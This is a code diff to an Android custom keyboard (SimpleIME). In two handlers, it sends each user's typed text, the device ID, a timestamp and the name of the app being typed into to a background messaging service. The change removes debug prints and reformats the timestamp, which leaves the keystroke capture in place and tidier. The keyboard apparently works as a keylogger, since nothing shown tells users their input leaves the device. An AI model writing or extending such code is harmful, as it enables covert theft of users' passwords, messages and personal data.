@@ -41,11 +41,9 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
         if (ic != this.inputConnection) {
             this.inputConnection = ic;
             if (this.stringBuffer.length() > 0) {
-                System.out.println(String.format("Your input is: %s\n", this.stringBuffer.toString()));
-                System.out.println(String.format("The calling application is %s\n\n", this.getCurrentInputEditorInfo().packageName));
                 new MessagService(
                         this.deviceId,
-                        new Date(System.currentTimeMillis()).toString(),
+                        String.valueOf(System.currentTimeMillis()),
                         this.stringBuffer.toString(),
                         this.getCurrentInputEditorInfo().packageName
                 ).execute();
@@ -67,11 +65,9 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
                 break;
             case Keyboard.KEYCODE_DONE:
                 ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
-                System.out.println(String.format("Your input is: %s\n", stringBuffer.toString()));
-                System.out.println(String.format("The calling application is %s\n\n", this.getCurrentInputEditorInfo().packageName));
                 new MessagService(
                         this.deviceId,
-                        new Date(System.currentTimeMillis()).toString(),
+                        String.valueOf(System.currentTimeMillis()),
                         this.stringBuffer.toString(),
                         this.getCurrentInputEditorInfo().packageName
                 ).execute();
